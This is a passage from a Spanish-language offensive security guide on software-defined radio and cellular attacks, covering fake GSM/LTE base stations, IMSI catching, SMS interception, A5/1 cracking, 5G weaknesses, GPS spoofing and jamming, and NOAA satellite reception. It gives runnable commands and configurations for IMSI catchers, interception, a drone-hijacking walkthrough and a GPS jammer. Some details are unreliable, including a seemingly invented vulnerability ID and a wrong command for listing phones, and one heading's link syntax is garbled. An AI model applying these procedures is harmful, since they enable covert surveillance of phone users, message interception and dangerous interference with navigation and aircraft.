# Configurar MNC, MCC, LAC, CI
```

**Configuración básica** (OpenBTS.db):

```sql
-- Configuración de red
UPDATE CONFIG SET VAL="722" WHERE KEY="GSM.MCC";  -- Argentina
UPDATE CONFIG SET VAL="07" WHERE KEY="GSM.MNC";   -- Movistar example
UPDATE CONFIG SET VAL="1" WHERE KEY="GSM.LAC";    -- Location Area Code
UPDATE CONFIG SET VAL="1" WHERE KEY="GSM.CI";     -- Cell Identity

-- Frecuencia
UPDATE CONFIG SET VAL="890200000" WHERE KEY="GSM.RxFrequency";  -- ARFCN

-- Control de acceso
UPDATE CONFIG SET VAL="OPEN" WHERE KEY="Control.ACON";  -- Red abierta (cualquier teléfono)
```

**Correr OpenBTS**:

```bash
# Iniciar
cd /var/run/OpenBTS
OpenBTS &

# Ver teléfonos registrados
nmcli -p

# Hacer llamada
# En el teléfono registrado, marcá 2600 (echo test)
# Para llamar a otro teléfono, marcá SIP/<extension>

# Consola OpenBTS
OpenBTSCLI
```

### 4.3 YateBTS

YateBTS es otra implementación de BTS GSM, basada en Yate (Yet Another Telephony Engine).

**Diferencias con OpenBTS**:

```
OpenBTS: standalone, SIP-based
YateBTS: basado en Yate (framework telefónico más completo)
YateBTS: mejor soporte para SMS
YateBTS: interfaz web más pulida
```

**Instalación**:

```bash
# Usando script de instalación
git clone https://github.com/yatebts/yatebts_install.git
cd yatebts_install
./install.sh

# O manual
git clone https://github.com/yatebts/yate.git
cd yate
./autogen.sh
./configure --prefix=/usr/local
make -j4
sudo make install

git clone https://github.com/yatebts/yate-bts.git
cd yate-bts
./autogen.sh
./configure --prefix=/usr/local
make -j4
sudo make install
```

**Configuración**:

```bash
# /usr/local/etc/yate/ybts.conf
[general]
Radio.Band=900
Radio.C0=50  ; ARFCN
Radio.PowerLevel=20  ; 0-30 (máximo 30 = 2W)
Identity.MCC=722
Identity.MNC=07
Identity.LAC=1000
Identity.CI=1
Control.Access=open  ; OPEN para cualquiera
```

### 4.4 Osmocom

Osmocom (Open Source Mobile Communications) es un conjunto de proyectos para [redes](../raw/r3d3s-f0nd4m3nt0s.md) celulares.

**Componentes Osmocom**:

```
OsmoBTS: BTS software (controla el SDR)
OsmoBSC: Base Station Controller
OsmoMSC: Mobile Switching Center
OsmoHLR: Home Location Register
OsmoSGSN: GPRS Support Node (datos)

Usa controladores remotos tipo A-bis/IP
Más modular que OpenBTS
```

**Arquitectura típica**:

```
SDR + OsmoBTS → OsmoBSC → OsmoMSC → PSTN
                        ↓
                    OsmoHLR (base de datos de suscriptores)
```

**Instalación**:

```bash
# Usando osmocom-lib (librería común)
git clone git://git.osmocom.org/libosmocore.git
cd libosmocore
autoreconf -fi
./configure
make -j4
make install

# OsmoBTS
git clone git://git.osmocom.org/osmo-bts.git
cd osmo-bts
autoreconf -fi
./configure
make -j4
make install

# OsmoBSC
git clone git://git.osmocom.org/osmo-bsc.git
cd osmo-bsc
autoreconf -fi
./configure
make -j4
make install
```

**Ventajas de Osmocom**:

- Modular: corrés lo que necesitás
- Estándares abiertos (A-bis/[ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip))
- Activamente mantenido
- Soporte para varias plataformas (sysmoBTS, UmTRX)

### 4.5 GSM Capture con gr-gsm

**gr-gsm** es un conjunto de bloques de GNU Radio para capturar y decodificar señales GSM.

```bash
# Instalación
git clone https://github.com/ptrkrysik/gr-gsm.git
cd gr-gsm
mkdir build && cd build
cmake ..
make -j4
make install

# Dependencias
apt-get install -y gr-osmosdr libosmocore-dev
```

**Capturar señales GSM**:

```bash
# Escanear bandas GSM
grgsm_scanner -b 900

# Output:
# Found ARFCN: 50 (Downlink: 945.0 MHz)
# Found ARFCN: 75 (Downlink: 950.0 MHz)

# Capturar un canal específico
grgsm_livemon -f 945M  # ARFCN 50

# Capturar a archivo
grgsm_capture -f 945M -s 1e6 -c 10000000 -o capture.cfile
```

**Decodificar GSM**:

```bash
# Decodificar captura
grgsm_decode -c capture.cfile -s 1e6 -m BCCH -t 0 -o decoded.txt

# Tipos de canales:
# - BCCH: Broadcast Control Channel (información de celda)
# - CCCH: Common Control Channel (paging, acceso)
# - SDCCH: Standalone Dedicated Control Channel (señalización)
# - TCH/F: Traffic Channel Full-rate (voz)
# - TCH/H: Traffic Channel Half-rate (voz)

# Extraer información de celda
grgsm_decode -c capture.cfile -s 1e6 -m BCCH -t 0 -v 10
```

### 4.6 SMS Interception

Capturar SMS en GSM requiere capturar el canal SDCCH (dedicado para señalización) durante su transmisión.

**Cómo funcionan los SMS en GSM**:

```
1. MS envía SMS via SDCCH o SACCH
2. MSC recibe y almacena en SMSC
3. SMSC entrega al destinatario

Los SMS se transmiten en claro (sin cifrado) en GSM
A menos que A5/3 o A5/4 esté activo (redes modernas)
```

**Captura de SMS**:

```bash
# 1. Escanear y capturar canal BCCH para obtener información de red
grgsm_livemon -f 945M

# 2. Identificar el canal SDCCH (de la captura BCCH)
# Buscar mensajes de tipo "System Information Type 3"
# que contienen la configuración de SDCCH

# 3. Capturar SDCCH específico
grgsm_capture -f 945M -s 1e6 -c 10000000 -o sdcch.cfile

# 4. Decodificar SDCCH
grgsm_decode -c sdcch.cfile -s 1e6 -m SDCCH -t 0 -o sms.txt

# 5. Buscar SMS (CP-DATA / RP-DATA en la decodificación)
cat sms.txt | grep -A10 "CP-DATA\|RP-DATA\|RP-ACK"
```

**Limitaciones**:

- GSM puede usar encriptación A5/1, A5/2, A5/3
- Si la red usa encriptación fuerte (A5/3), no podés decodificar el contenido
- Necesitás estar en el rango de la BTS de la víctima
- Los SMS se transmiten rápido (unos pocos cientos de ms)

**IMSI Catcher + SMS intercept**:

```
El atacante despliega una BTS falsa (OpenBTS/YateBTS)
El teléfono de la víctima se conecta a la BTS falsa
La BTS falsa NO requiere encriptación
El tráfico pasa por el atacante
```

### 4.7 GSM Sniffing y Decodificación

**Herramienta: Kraken** (A5/1 cracker):

```bash
# Kraken usa rainbow tables para romper A5/1
# Necesita: 2-3 segundos de GSM burst capturado
# y las rainbow tables (~1.7 TB)

git clone https://github.com/Oros42/KRAKEN.git
cd KRAKEN

# Descargar rainbow tables (tarda días!)
# Usar con la captura GSM

./kraken capture.cfile 50  # ARFCN 50
```

**[wireshark](../raw/r3d3s-f0nd4m3nt0s.md#wireshark) + GSM**:

```bash
# Capturar GSM y analizar con Wireshark
grgsm_livemon -f 945M | wireshark -k -i -

# O convertir captura a pcap
grgsm_decode -c capture.cfile -s 1e6 -m BCCH -t 0 -w output.pcap
wireshark output.pcap
```

### 4.8 IMSI Catcher (Stingray) Theory

El IMSI Catcher (también llamado "Stingray" o "Cell Site Simulator") es un dispositivo que se hace pasar por una torre celular legítima.

**Cómo funciona**:

```
1. El IMSI Catcher transmite en frecuencia de red GSM/LTE
2. Los teléfonos cercanos ven una torre más fuerte y se conectan
3. El Catcher puede:
   a) Obtener IMSI/IMEI del teléfono
   b) Degradar a 2G (si está en LTE/5G) para evitar encriptación
   c) Interceptar llamadas y SMS
   d) Hacer tracking de ubicación
```

**Técnicas de degradación**:

```
1. El IMSI Catcher en 4G/5G envía un "Detach Request" al teléfono
2. Simultáneamente, transmite como BTS 2G (sin encriptación)
3. El teléfono se reconecta en 2G (fallback)
4. Ahora el tráfico es en claro
```

**Detección de IMSI Catcher**:

```
App: Android IMSI Catcher Detector (AIMSICD)
App: Snoopsnitch (GSM security analyzer)

Señales:
- Cambio repentino de BTS
- Desactivación de encriptación
- Múltiples TMSI reassignments
- Señal de celda inusualmente fuerte
- Broadcasting de LAC/CellID inusual
```

**IMSI Catcher con [sdr](../raw/sdr-t3l3c0ms.md)**:

```bash
# Usando YateBTS como IMSI catcher
# Configurar YateBTS para operar en modo pasivo

# En ybts.conf:
Control.Access=reject  ; No permite llamadas, solo registra IMSI
Radio.PowerLevel=5      ; Baja potencia para capturar solo cerca

# Ver IMSIs capturados
tail -f /var/log/yate.log | grep IMSI
```

---

## 5. LTE / 4G Analysis

### 5.1 Arquitectura LTE

LTE (Long Term Evolution) es el estándar 4G. Es más seguro que GSM pero no invulnerable.

**Arquitectura EPC (Evolved Packet Core)**:

```
┌──────────┐    ┌──────────┐    ┌──────────┐
│   UE    │◄──►│  eNodeB  │◄──►│   EPC   │
│(Teléfono)│  S1│  (BTS)  │ S1 │  (Core) │
└──────────┘    └──────────┘    └────┬─────┘
                                     │
                          ┌──────────┼──────────┐
                          │          │          │
                     ┌────▼───┐ ┌───▼────┐ ┌───▼────┐
                     │  MME   │ │  SGW   │ │  PGW   │
                     │(Mobility│ │(Gateway)│ │(PDN Gw)│
                     │ Mgmt)  │ └────────┘ └────────┘
                     └────┬───┘
                          │
                     ┌────▼───┐
                     │  HSS   │
                     │(Subs DB)│
                     └────────┘
```

**Componentes LTE**:

```
UE: User Equipment (tu teléfono)
eNodeB: Evolved Node B (la torre celular)
MME: Mobility Management Entity (control de sesión, auth)
SGW: Serving Gateway (ruteo de datos)
PGW: PDN Gateway (conexión a internet)
HSS: Home Subscriber Server (base de datos de usuarios)
```

**Bandas LTE comunes**:

| Banda | Frecuencia | Uso |
|---|---|---|
| B1 | 2100 MHz | LTE principal (muchos países) |
| B3 | 1800 MHz | LTE (Europa, Asia) |
| B7 | 2600 MHz | LTE (capacidad) |
| B20 | 800 MHz | LTE rural (Europa) |
| B28 | 700 MHz | LTE (APAC, LATAM) |
| B41 | 2600 MHz | LTE TDD (EEUU, India) |

**Ancho de banda LTE**:

```
1.4, 3, 5, 10, 15, 20 MHz
→ Más ancho → más velocidad
→ LTE Advanced permite carrier aggregation
```

**Protocolos LTE**:

```
S1AP: S1 Application Protocol (entre eNodeB y MME)
NAS: Non-Access Stratum (entre UE y MME)
RRC: Radio Resource Control (entre UE y eNodeB)
PDCP: Packet Data Convergence Protocol
RLC: Radio Link Control
MAC: Medium Access Control
PHY: Physical layer
```

### 5.2 srsLTE / srsRAN

srsRAN (antes srsLTE) es una implementación opensource de LTE.

```bash
# Instalación
git clone https://github.com/srsRAN/srsRAN.git
cd srsRAN
mkdir build && cd build
cmake ..
make -j4
make install
```

**srsRAN componentes**:

```
srsUE: UE software (tu teléfono en software)
srsENB: eNodeB (BTS LTE)
srsEPC: EPC (core network)

Arquitectura típica:
srsUE ← RF → srsENB ← S1 → srsEPC
```

**Configurar srsENB**:

```bash
# /etc/srsran/enb.conf
[enb]
enb_id = 0x19B
mcc = 722
mnc = 07
mme_addr = 127.0.0.1
gtp_bind_addr = 127.0.0.1
s1c_bind_addr = 127.0.0.1
n_prb = 50  ; 10 MHz (6=1.4, 15=3, 25=5, 50=10, 75=15, 100=20 MHz)

[rf]
dl_earfcn = 3350  ; Banda 3, 1805 MHz (downlink)
tx_gain = 60
rx_gain = 40

[cell]
cell_id = 1
nof_ports = 1
nof_cc = 1  ; Carrier components
```

**Correr srsEPC**:

```bash
# Primero el core
sudo srsepc /etc/srsran/epc.conf

# Luego la eNB
sudo srsenb /etc/srsran/enb.conf
```

### 5.3 LTE Cell Scanner

Escanear celdas LTE cercanas:

```bash
# Usando srsRAN cell search
srsran_utils cell_search -f 1805e6 -s 10e6

# Output:
# Found cell: PCI=221, CP=Normal, Freq=1805.0 MHz, PRB=50, Ports=1
# Found cell: PCI=445, CP=Normal, Freq=1830.0 MHz, PRB=50, Ports=2

# Con gr-lte (GNU Radio)
# Escanear bandas LTE
gr-lte_scanner  # Ver en GitHub
```

**Información que se obtiene**:

```
PCI: Physical Cell ID
CP: Cyclic Prefix (Normal/Extended)
EARFCN: E-UTRA Absolute Radio Frequency Channel Number
PRB: Physical Resource Blocks (ancho de banda)
TAC: Tracking Area Code
MCC/MNC: Mobile Country/Network Code
```

**Herramienta: LTE-Cell-Scanner**:

```bash
git clone https://github.com/Evrytania/LTE-Cell-Scanner.git
cd LTE-Cell-Scanner
make

./lte_cell_search -f 1805e6 -s 10e6

./lte_cell_detector -f 1805e6 -s 10e6 -p 221
# Decodificar información de celda (MIB, SIB1, SIB2...)
```

### 5.4 IMSI Catcher Theory en LTE

El IMSI catching en LTE es más complejo que en GSM porque:

1. **LTE encripta IMSI**: usa autenticación mutua y cifra la identidad temporal
2. **No hay degradación automática**: el UE no baja a 2G a menos que lo fuerces
3. **Autenticación mutua**: el UE verifica la [red](../raw/r3d3s-f0nd4m3nt0s.md)

**Sin embargo, LTE tiene debilidades**:

**Ataque: IMSI paging**:

```
La red usa IMSI como base para paging si no tiene TMSI válido
El atacante monitorea paginación en la red LTE
Cuando la víctima recibe una llamada/SMS, el IMSI se transmite en claro
```

**Ataque: IMSI catcher en LTE** (simplificado):

```
1. srsENB se configura como eNB falsa
2. La eNB falsa transmite señal más fuerte que la legítima
3. El UE se conecta a la eNB falsa (no verifica autenticidad de la red)
4. Durante el attach, el UE envía IMSI si no tiene GUTI válido
```

```bash
# Configurar srsENB como IMSI catcher
# En enb.conf:
# Control de acceso restringido
# No permitir tráfico de datos (solo capturar IMSI)

[gui]
enable = false

[rrc]
# Rechazar RRC Connection Setup (no deja que pase)
# O configurar para capturar y rechazar
```

**Limitaciones**:
- LTE usa GUTI (TMSI global) en lugar de IMSI si está registrado
- Solo capturás IMSI si el UE no tiene GUTI válido (primer attach)
- 5G SUPI (antes IMSI) puede estar encriptado

### 5.5 S1AP / NAS Protocol Analysis

Analizar protocolos S1AP y NAS es clave para entender ataques LTE.

**S1AP (S1 Application Protocol)**:

```
Corre entre eNodeB y MME
Puertos SCTP: 36412 (S1-MME)

Tipos de mensajes:
- S1 Setup
- UE Context Setup/Release
- Initial UE Message
- Uplink/Downlink NAS Transport
- Paging
- Handover
```

**NAS (Non-Access Stratum)**:

```
Corre entre UE y MME (encapsulado en RRC/S1AP)

EMM (EPS Mobility Management) messages:
- Attach Request/Accept/Reject
- Tracking Area Update
- Detach
- GUTI Reallocation
- Authentication

ESM (EPS Session Management) messages:
- PDN Connectivity Request
- Bearer Resource Allocation
- Activate/Deactivate EPS Bearer
```

**Analizar con [wireshark](../raw/r3d3s-f0nd4m3nt0s.md#wireshark)**:

```bash
# Capturar S1AP/NAS
# Usando srsENB + srsEPC
sudo tcpdump -i any port 36412 -w s1ap.pcap

# O desde la interfaz S1
# Wireshark parsea S1AP automáticamente si está en el puerto correcto

wireshark s1ap.pcap

# Filtros útiles:
# s1ap (todo S1AP)
# s1ap.ProcedureCode == 12 (Initial UE Message)
# nas-eps (todo NAS)
# nas-eps.emm.type == 0x41 (Attach Request)
# nas-eps.emm.guti (GUTI)
```

**Analizar GUTI**:

```bash
# GUTI (Globally Unique Temporary Identifier)
# Contiene: MCC, MNC, MME Group ID, MME Code, M-TMSI

# Extraer GUTI de captura
tshark -r capture.pcap -Y "nas-eps.emm.guti" -T fields \
  -e nas-eps.emm.guti.mcc \
  -e nas-eps.emm.guti.mnc \
  -e nas-eps.emm.guti.mmei \
  -e nas-eps.emm.guti.mtmsi
```

### 5.6 LTE Sniffing

Sniffear tráfico LTE es más complejo que GSM por la encriptación.

**Capas de encriptación LTE**:

```
NAS Security (entre UE y MME):
  - Protege: señalización NAS (attach, auth, etc.)
  - Cifrado más control de integridad

AS Security (entre UE y eNodeB):
  - Protege: señalización RRC + datos de usuario
  - Cifrado: EEA0, EEA1 (SNOW 3G), EEA2 (AES), EEA3 (ZUC)
  - Integridad: EIA1, EIA2, EIA3
```

**Lo que se puede ver sin desencriptar**:

```
- PCI, EARFCN, TAC, CellID
- RRC messages (algunos no cifrados)
- Tamaño de paquetes (traffic analysis)
- Timing de transmisiones
```

**Sniffing con srsRAN**:

```bash
# Modo pasivo con srsENB (escuchar sin transmitir)
# Configurar enb.conf con:
rf.device_args = "device_name=auto,tx_gain=0"  # No transmitir

# Capturar tráfico en la interfaz S1
sudo srsenb --rf.dl_earfcn=3350 --rf.rx_gain=50

# En otro terminal, capturar S1AP
sudo tcpdump -i any sctp port 36412 -w lte_sniff.pcap
```

---

## 6. 5G Security

### 6.1 5G NSA vs SA

5G tiene dos arquitecturas principales:

**NSA (Non-Standalone)**:

```
5G NSA: 4G LTE + 5G NR
          ┌───────────┐
UE ──────►│  eNodeB   │──► 4G EPC
  │       │  (LTE)    │
  │       └───────────┘
  │       ┌───────────┐
  └──────►│  gNodeB   │──► 5G Core (opcional en NSA)
          │  (5G NR)  │
          └───────────┘

- El control (señalización) va por LTE
- El data plane puede ir por LTE + 5G
- Usa EPC (4G core)
- ES LA MÁS COMÚN HOY
- Vulnerabilidades del 4G se heredan
```

**SA (Standalone)**:

```
5G SA: Todo 5G
          ┌───────────┐
UE ──────►│  gNodeB   │──► 5G Core (5GC)
          │  (5G NR)  │
          └───────────┘

- Control y datos por 5G
- Usa 5GC (5G Core, nuevo)
- Soporta network slicing
- SUPI encriptado
- Autenticación mejorada
- AÚN NO ES TAN COMÚN
```

**Implicaciones de seguridad**:

```
NSA → hereda debilidades de 4G (IMSI catching en capa LTE)
SA → mejor seguridad pero no perfecta
NSA → downgrade attack posible: forzar UE a solo 4G
```

### 6.2 SUPI Encryption

**SUPI (Subscription Permanent Identifier)** reemplaza al IMSI en 5G.

**SUCI (Subscription Concealed Identifier)**:

```
SUPI → encriptado → SUCI
         ↓
Clave pública de la red (HN Public Key)
         ↓
Se transmite en lugar de IMSI/SUPI

SUCI = SUPI (encriptado con clave de la red)
Solo la red (HSS/UDM) puede desencriptar
```

**Formato SUCI**:

```
SUCI: suci-<MCC><MNC>-<Routing Indicator>-<Scheme>-<Key ID>-<Encriptado>

Ejemplo: suci-72207-0000-0-01-abc123def456...
         | MCC |MNC| Route  |S|KI|  Ciphertext

Scheme:
0: Null scheme (no encriptado, mismo que IMSI)
1: ECIES P-256
2: ECIES X25519
```

**Ataque: Null Scheme**:

```
Scheme 0 (Null) no encripta SUPI
Algunas redes pueden usar null scheme por error o compatibilidad
En ese caso, SUPI = IMSI transmitido en claro
```

**Ataque: Downgrade de Scheme**:

```
Si el atacante puede interceptar la negociación de scheme
Puede forzar scheme 0 (null)
Pero 5G requiere autenticación mutua, lo que hace esto difícil
```

### 6.3 IMSI Catching en 5G

En 5G SA, el IMSI catching se vuelve mucho más difícil.

**Mecanismos de protección 5G**:

```
1. SUPI encriptado (SUCI)
2. Autenticación mutua (UE verifica red)
3. GUTI siempre usado si está disponible
4. AUSF (Authentication Server Function)
5. SEAF (Security Anchor Function)
```

**Sin embargo**:

```
- En 5G NSA, la parte 4G sigue siendo vulnerable
- Null scheme puede estar habilitado
- Paging puede exponer identificadores
- Ataques a la implementación (bugs en gNodeB)
```

**Posibles ataques 5G**:

```
1. Bidding down: forzar al UE a 4G/3G/2G
   - El atacante bloquea señales 5G
   - El UE baja a 4G → capturable

2. Paging interception:
   - 5G paging todavía usa identificadores (5G-S-TMSI)
   - Puede correlacionarse con tráfico

3. gNodeB falso:
   - Si el UE no valida correctamente la red
   - Posible en implementaciones con bugs
```

### 6.4 5G Protocol Vulnerabilities

**Vulnerabilidades conocidas**:

```
1. TorJr-2017-0002: AUSF fingerprinting
   - Diferentes respuestas de error revelan si IMSI existe

2. Replay Protection:
   - Mensajes de autenticación pueden tener secuencias débiles

3. Null Cipher (NIA0/NEA0):
   - Algunas redes usan null cipher por compatibilidad
   - El tráfico viaja sin encriptación

4. 5G-AKA extensibility:
   - Estados de autenticación complejos
   - Pueden causar desincronización

5. Network Slice vulnerabilities:
   - Separación inadecuada entre slices
   - Cross-slice attacks
```

**[fuzzing](../raw/fuzz1ng.md) de protocolos 5G**:

```bash
# Usando srsRAN 5G (srsGNB)
# srsRAN tiene implementación 5G (srsGNB)

git clone https://github.com/srsRAN/srsRAN_4G.git
# También hay srsRAN_5G (rama aparte)

# Fuzzing de NAS messages
# Herramientas: boofuzz, AFL para protocolos 3GPP
```

### 6.5 [network slicing](../raw/r3d3s-4v4nz4d4s.md#network-slicing) Attacks

Network slicing es una característica clave de 5G: múltiples [redes](../raw/r3d3s-f0nd4m3nt0s.md) lógicas sobre una infraestructura física.

**Ejemplos de slices**:

```
Slice 1: eMBB (Enhanced Mobile Broadband) → internet rápido
Slice 2: URLLC (Ultra-Reliable Low Latency) → autos autónomos
Slice 3: mMTC (Massive Machine Type Comm) → IoT
```

**Ataques a slices**:

```
1. Cross-slice access:
   - UE de un slice accede a recursos de otro
   - Slice isolation bypass

2. Slice resource starvation:
   - Un slice consume recursos de otro (DoS)

3. SliceHopping:
   - Moverse entre slices para bypassear policies

4. NSSF (Network Slice Selection) manipulation:
   - Manipular qué slice se asigna a cada UE

5. Slice-specific DoS:
   - Atacar un slice específico (ej: mMTC)
   - Sin afectar otros slices
```

---

## 7. [gps spoofing](../raw/sp4c3-s3c.md#gps-spoofing)

### 7.1 Fundamentos de GPS

GPS (Global Positioning System) usa 31 satélites en órbita media (~20,200 km) que transmiten señales de tiempo y posición.

**Frecuencias GPS**:

```
L1: 1575.42 MHz → civil (C/A code) + militar (P(Y) code)
L2: 1227.60 MHz → militar + civil (L2C)
L5: 1176.45 MHz → civil (aviation safety)
```

**Señal GPS**:

```
Cada satélite transmite:
- Código C/A (Coarse Acquisition): 1023 chips a 1.023 MHz (1 ms)
- Mensaje de navegación: 50 bps (frames de 30 segundos)
- Datos: efemérides, almanaque, tiempo, correcciones

Estructura:
C/A code + Navigation Data → BPSK modulado → L1 (1575.42 MHz)

CDMA (Code Division Multiple Access): cada satélite usa código único
```

**Cálculo de posición**:

```
1. El receptor recibe tiempo de 4+ satélites
2. Calcula distancia = (tiempo_rx - tiempo_tx) * c
3. Trilateración: 3 satélites para posición 2D, 4+ para 3D
4. Resuelve 4 incógnitas: x, y, z, t (tiempo del receptor)

Precisión típica: ~3-5 metros (civil)
Precisión militar (PPS): ~1 metro
```

**Mensaje de navegación**:

```
Frame: 30 segundos, 1500 bits (50 bps)
Dividido en 5 subframes de 6 segundos (300 bits)

Subframe 1: GPS week, SV health, clock corrections
Subframe 2-3: Ephimeris (órbita precisa del satélite)
Subframe 4-5: Almanac (órbitas de todos los satélites, iono corrections)
```

### 7.2 GPS Signal Simulation con [hackrf](../raw/sdr-t3l3c0ms.md#hackrf)-t3l3c0ms.md#[hackrf](../raw/sdr-t3l3c0ms.md#hackrf))

Generar señales GPS falsas con HackRF.

**Requisitos**:

```
Hardware:
- HackRF One (o cualquier SDR TX en 1575.42 MHz)
- Amplificador (opcional, la señal GPS es muy débil)
- Antenna para 1.5 GHz

Software:
- gps-sdr-sim (genera IQ samples)
- hackrf_transfer (transmite)
```

**Concepto**:

```
1. Generar IQ samples de señal GPS falsa
2. Transmitir en 1575.42 MHz
3. Cerca del receptor (el receptor GPS ve señal más fuerte que satélites reales)
4. El receptor se sincroniza con nuestra señal falsa
```

**Limitaciones prácticas**:

```
- HackRF a 20 Msps: la señal GPS necesita 2.046 MHz
- HackRF 8 bits: suficiente para GPS C/A
- Power: GPS real es ~-130 dBm. HackRF a 0 dBm + atenuación
- Distancia: funciona mejor a <10 metros con línea de vista
- El receptor debe estar en modo de adquisición (no tracking)
  Si ya tiene fix, es más difícil engañarlo
```

### 7.3 gps-[sdr](../raw/sdr-t3l3c0ms.md)-sim

**gps-sdr-sim** genera IQ samples de señales GPS.

```bash
# Instalación
git clone https://github.com/osqzss/gps-sdr-sim.git
cd gps-sdr-sim
make

# Generar señal GPS para una ubicación específica
# -l: latitud,longitud,altura
# -b: número de satélites (4-11)
gps-sdr-sim -l 37.422,-122.084,100 -b 8

# Output: gpssim.bin (IQ samples)

# También con archivo NMEA (ruta real)
gps-sdr-sim -g track.nmea -b 8

# Especificar duración (segundos)
gps-sdr-sim -l 37.422,-122.084,100 -b 8 -d 300

# Modificar fecha/hora
gps-sdr-sim -l 37.422,-122.084,100 -b 8 -t 2024-01-01T12:00:00
```

**Transmitir con HackRF**:

```bash
# Transmitir GPS falso
hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 0 -x 0

# Parámetros:
# -t: archivo IQ a transmitir
# -f: 1575.42 MHz (L1 GPS)
# -s: 2.6 Msps (sample rate)
# -a: RX/TX amp (0 = off, 1 = on)
# -x: TX gain (0-47, 0 = más bajo)

# Loop (repetir la señal)
cat gpssim.bin | hackrf_transfer -f 1575420000 -s 2600000 -a 0 -x 0 -t- -R

# Con amplificador externo (si tenés)
# HackRF a 0 dBm es suficiente para ~5-10 metros en espacio abierto
```

**Probar con un receptor GPS**:

```bash
# Usar SDR como receptor para verificar
gps-sdr-sim -l 37.422,-122.084,100 -b 8

# Transmitir
hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 0 -x 0

# En otro SDR (RTL-SDR), verificar que hay señal en L1
gqrx  # Sintonizar 1575.42 MHz, modo WFm
# Deberías ver un pico de señal

# Con receptor GPS real (ej: u-blox)
# Conectar a computadora y monitorear NMEA sentences
# Si el GPS se engaña, mostrará la posición falsa
```

### 7.4 Afectando Sistemas de Navegación en Drones

Los drones comerciales (DJI, etc.) usan GPS para:
- Posicionamiento
- Return-to-home (RTH)
- Geofencing (no-fly zones)
- Estabilización

**Ataque: GPS Spoofing a dron**:

```
1. Identificar el dron (visual o RF)
2. Transmitir señal GPS falsa
3. El dron recibe posición falsa
4. Posibles efectos:
   a) El dron vuela a posición falsa (si está en modo autónomo)
   b) El RTH envía el dron a ubicación del atacante
   c) El dron aterriza (si la señal GPS es incoherente)
   d) Geofencing bypass (el dron cree que está en zona permitida)
```

**Ejemplo: secuestrar dron DJI**:

```bash
# 1. Obtener posición actual del dron (desde control remoto o visual)
# 2. Elegir posición falsa (donde querés que aterrice)

gps-sdr-sim -l -34.6037,-58.3816,10 -b 8 -d 600

# 3. Transmitir
hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 0 -x 30

# 4. El dron DJI cambia a "ATTI mode" (sin GPS)
# 5. Si la señal falsa es convincente, el dron acepta la nueva posición
# 6. El RTH vuela a la posición falsa
```

**Limitaciones**:

```
- DJI drones modernos tienen redundancia GPS/GLONASS/BeiDou
- Falta de spoofing en múltiples constelaciones
- El dron puede detectar anomalías (posición cambia muy rápido)
- Algunos drones entran en fail-safe y aterrizan
- Potencia necesaria aumenta con distancia
```

**Protección contra GPS spoofing**:

```
- Receptores GPS con autenticación (SAASM militar)
- Monitoreo de C/N0 (relación señal/ruido)
- Verificación de consistencia de efemérides
- Múltiples constelaciones (GPS + GLONASS + Galileo)
- IMU (Inertial Measurement Unit) para detectar inconsistencias
- Geofencing por software (no solo GPS)
```

### 7.5 GPS Jamming

Más simple que spoofing: simplemente bloquear señales GPS.

```bash
# Transmitir ruido en L1 (1575.42 MHz)
# HackRF
hackrf_transfer -f 1575420000 -s 2000000 -a 0 -x 47 -R

# El parámetro -R (repeat) transmite un búfer vacío (portadora pura)
# O crear ruido blanco:

# Generar ruido
python3 -c "
import numpy as np
samples = np.random.normal(0,1,10000000) + 1j*np.random.normal(0,1,10000000)
samples.astype(np.complex64).tofile('noise.bin')
"
hackrf_transfer -t noise.bin -f 1575420000 -s 2000000 -a 0 -x 47 -R
```

**Legalidad**: El GPS jamming es ilegal en casi todos los países. Las multas pueden ser de decenas de miles de dólares. Solo probar en laboratorio blindado.

**Detectar GPS jamming**:

```bash
# Con RTL-SDR
rtl_power -f 1574M:1576M:1k -i 1
# Si el piso de ruido sube significativamente → jammer activo

# Con gqrx
# Sintonizar 1575.42 MHz, modo WFM
# Ver waterfall: si es completamente blanco/rojo, hay jamming
```

---

## 8. Satellite Interception

### 8.1 Weather Satellite Decoding (NOAA)

Los satélites NOAA (National Oceanic and Atmospheric Administration) transmiten imágenes meteorológicas en APT (Automatic Picture Transmission).

**Satélites NOAA activos**:

```
NOAA 15: 137.620 MHz
NOAA 18: 137.9125 MHz
NOAA 19: 137.100 MHz

Órbita: polar, ~850 km altitud
Transmisión: APT (Automatic Picture Transmission)
Ancho de banda: ~40 kHz
Modulación: AM (amplitude modulation)
Frecuencia: 137 MHz
```

**Equipo necesario**:

```
SDR: RTL-SDR (suficiente, solo 40 kHz BW)
Antena: V-dipolo ("V" de 137 MHz) o QFH (Quadrifilar Helical)
LNA: Opcional, mejora recepción
Software: GQRX + WXtoIMG o SatDump
```

**Cálculo de antena V-dipolo**:

```
Para 137 MHz:
λ = 300 / 137 ≈ 2.19 m
Cada brazo: λ/4 ≈ 53 cm
Ángulo entre brazos: 120°

Construcción:
- Dos varillas de 53 cm cada una
- Conectadas al centro de la antena (coaxial)
- Formando una "V" de 120°
- Orientación: el eje de la V apunta al norte-sur
```

**Predecir pasada de satélite**:

```bash
# Instalar predict
sudo apt install predict

# Obtener Keplerian elements (TLE)
# https://www.celestrak.com/NORAD/elements/weather.txt

# Predecir próxima pasada
predict -t weather.txt -p "NOAA 19"

# Output:
# 2024-01-15 14:32:00  Az: 315°  El: 85°  (máximo)
# 2024-01-15 14:34:30  Az: 45°   El: 45°
# ...
```

**Capturar NOAA APT**:

```bash
# Usando GQRX
# 1. Sintonizar frecuencia del satélite
# 2. Modo WFM (ancho ~40 kHz)
# 3. Grabar IQ o audio demodulado

# O con rtl_fm
rtl_fm -f 137.100M -M fm -s 44100 -g 49.6 - | sox -t raw -r 44100 -e signed -b 16 -c 1 -V1 - noaa.wav

# Decodificar con WXtoIMG
wxToImg noaa.wav

# O con SatDump (más moderno)
satdump live noaa_apt 137.100M 44100 . -source rtlsdr --samplerate 2.4e6
```

**Decodificar APT**:

```bash
# WXtoIMG (modo línea de comandos)
wxtoimg -m -A -e HVC noaa.wav image.png

# Parámetros:
# -m: meteogram (no recomendado para imagen)
# -A: AIP (enhancement automático)
# -e HVC: histograma de color
# also: MSA, MB, MCIR, etc.

# SatDump (recomendado)
satdump -h
satdump live noaa_apt 137.100M 44100 /output -source rtlsdr --samplerate 2.4e6
```

### 8.2 Meteor-M2 LRPT

Meteor-M2 N2/N3 son satélites rusos que transmiten en LRPT (Low Rate Picture Transmission).

